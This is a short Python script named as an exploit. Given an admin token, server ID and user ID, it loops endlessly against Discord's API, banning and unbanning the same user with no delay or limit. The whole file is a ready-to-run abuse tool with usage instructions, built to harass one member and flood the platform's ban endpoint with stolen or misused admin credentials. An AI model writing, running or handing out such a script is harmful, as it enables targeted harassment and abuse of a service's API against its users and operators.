import sys
import requests

class Exploit:
    def __init__(self, token, serverid, userid) -> None:
        self.token = token
        self.serverid = serverid
        self.userid = userid
        self.headers = {"Authorization": self.token}

    def run(self) -> None:
        while True:
            print("\nStatus Code -> " + str(requests.put(f"https://discord.com/api/v9/guilds/{self.serverid}/bans/{self.userid}", headers=self.headers).status_code))
            print(f"Banning user -> {self.userid}")
            print("\nStatus Code -> " + str(requests.delete(f"https://discord.com/api/v9/guilds/{self.serverid}/bans/{self.userid}", headers=self.headers).status_code))
            print(f"Unbanning user -> {self.userid}")

def main() -> None:
    if len(sys.argv) < 4:
        print("python3 exploit.py <admin_token> <server_id> <user_id>")
        sys.exit()
    token = sys.argv[1]
    serverid = sys.argv[2]
    userid = sys.argv[3]
    Exploit(token, serverid, userid).run()

if __name__ == "__main__":
    main()
